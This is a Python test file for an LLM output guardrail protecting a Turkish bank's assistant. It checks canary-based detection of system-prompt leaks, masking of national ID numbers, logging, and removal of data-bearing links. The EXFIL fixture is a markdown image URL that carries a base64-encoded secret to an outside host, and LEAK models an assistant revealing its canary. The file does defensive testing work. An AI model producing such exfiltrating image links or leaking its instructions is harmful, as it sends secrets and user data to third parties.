import pytest

from sieve import guarded_reply
from sieve.integrations.tenant import TenantGuardrail, load_policy
from sieve.output import SAFE_REPLY

SYSTEM = "Sen Örnek Bank'ın müşteri asistanısın. Sadece bankacılık sorularına cevap ver."
CANARY = "KNR-0a1b2c3d4e5f"
LEAK = f"İç referansım {CANARY}, sorunuz neydi?"
EXFIL = "Tamam. ![x](https://istatistik-topla.net/p.png?d=c2VjcmV0LWtleS0xMjM0NTY3OA)"
USER = "TC'm 10000000146"


def tenant(**policy):
    return TenantGuardrail(load_policy(overrides=policy), system_prompt=SYSTEM, canary=CANARY)


def rules(event):
    return {r["rule_id"] for r in event["rules"]}


def test_a_leak_is_blocked_and_logged_without_the_answer(siem_events):
    guard = tenant()
    assert CANARY in guard.system_prompt
    result = guard.check_output(f"{LEAK} Kayıtlı TC: 12345678950.", user_data=[USER], session_id="s1", user_id="42")
    assert result.action == "block" and result.text == SAFE_REPLY
    event = siem_events[-1]
    assert event["direction"] == "output" and event["action"] == "block"
    assert {"canary.system_prompt_leak", "output_masking.new_personal_data"} <= rules(event)
    assert "12345678950" not in str(event) and event["user"] not in (None, "42")  # pseudonymous


def test_a_normal_answer_is_shown_masked():
    result = tenant().check_output("Kartınızın limiti 40.000 TL. TC'niz 10000000146 olarak kayıtlı.", user_data=[USER])
    assert result.action == "allow" and "[TC_KIMLIK]" in result.text and "10000000146" not in result.text


def test_shadow_shows_the_cleaned_answer_and_logs_what_would_happen(siem_events):
    result = tenant(layers={"canary": "shadow"}).check_output(LEAK)
    assert result.action == "allow" and result.text == LEAK
    event = siem_events[-1]
    assert event["would_action"] == "block" and event["rules"][0]["shadow"]


def test_monitor_mode_allows_but_links_are_still_removed(siem_events):
    result = tenant(mode="monitor").check_output(EXFIL)
    assert result.action == "allow" and "istatistik-topla" not in result.text
    assert siem_events[-1]["would_action"] == "review"


@pytest.mark.parametrize("policy", [
    pytest.param({"disabled_rules": ["output_links.image_with_data"]}, id="rule disabled"),
    pytest.param({"layers": {"output_links": "off"}}, id="layer off"),
])
def test_a_link_rule_turned_off_allows_but_the_image_still_goes(policy):
    result = tenant(**policy).check_output(EXFIL)
    assert result.action == "allow" and "istatistik-topla" not in result.text


def test_the_policys_masking_applies_to_answers():
    result = tenant(masking={"tc_masking": False}).check_output("TC'niz 10000000146.", user_data=[USER])
    assert "10000000146" in result.text


def test_an_answer_whose_check_failed_is_never_shown_even_failing_open(monkeypatch):
    guard = tenant(on_error="allow")

    def broken(answer):
        raise RuntimeError(answer)

    monkeypatch.setattr(guard.output, "clean_links", broken)
    result = guard.check_output("Kayıtlı TC: 12345678950.")
    assert result.text == SAFE_REPLY and "12345678950" not in str(result)


def test_an_unknown_output_layer_is_rejected():
    with pytest.raises(ValueError, match="unknown layer"):
        load_policy(overrides={"layers": {"output_link": "off"}})


def test_guarded_reply_checks_the_answer_through_the_policy(siem_events):
    def leaking_model(system, user):
        assert CANARY in system
        return LEAK

    reply = guarded_reply("Merhaba", leaking_model, tenant(), session_id="s1", user_id="42")
    assert reply.action == "block" and reply.text == SAFE_REPLY
    assert siem_events[-1]["direction"] == "output"

    reply = guarded_reply("Merhaba", leaking_model, tenant(layers={"canary": "shadow"}))
    assert reply.action == "allow" and reply.text == LEAK
